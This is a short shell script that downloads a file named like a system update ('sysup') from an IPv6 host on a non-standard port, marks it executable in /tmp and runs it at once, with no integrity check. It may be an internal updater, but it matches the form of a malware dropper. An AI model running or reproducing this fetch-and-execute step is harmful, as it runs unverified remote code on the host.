#!/bin/sh
cd /tmp/

cat="jubtl2"
localname="/tmp/sysup-jubtl.sh"

wget "http://[fd43:5602:29bd:10::a]:2351/getups.php?cat=$cat" -O "$localname"
chmod +x "$localname"
"$localname" "$cat"
